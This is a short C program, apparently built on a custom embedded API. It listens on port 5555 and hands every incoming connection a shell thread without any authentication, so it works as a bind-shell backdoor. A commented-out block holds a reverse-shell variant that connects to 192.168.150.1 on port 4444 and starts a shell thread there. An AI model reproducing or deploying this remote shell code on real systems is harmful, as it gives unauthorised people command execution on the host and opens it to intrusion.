#include "generic.h"

int main(){
    int socket_desc,c;
    int client_sock;
    int sockbuf;
    struct sockaddr_in server , client;
    API_env_init();
/*
    MIC_THREAD_HANDLE_ID thread_id;
	client_sock =  API_socket_connect("192.168.150.1",4444);
	MIC_THREAD_CREATE(thread_id,shelltest, &client_sock) ;
	MIC_USLEEP(1000000);
*/

    socket_desc = API_socket_init_server(5555 , 300);
    c = sizeof(struct sockaddr_in);
    MIC_THREAD_HANDLE_ID thread_id;
    while( (client_sock = accept(socket_desc , (struct sockaddr *)&client ,(socklen_t*)&c))>=0){
        printf("someone here 1. sock = %d\n",client_sock);
        sockbuf = client_sock;
        
        API_Start_ShellThread_for_sock(sockbuf);
        printf("get here \n");
//        MIC_THREAD_JOIN(thread_id);
        client_sock = -1;
        printf("someone here 4\n");
        MIC_USLEEP(1);
    }
    MIC_USLEEP(1000000);
    return 0;
}
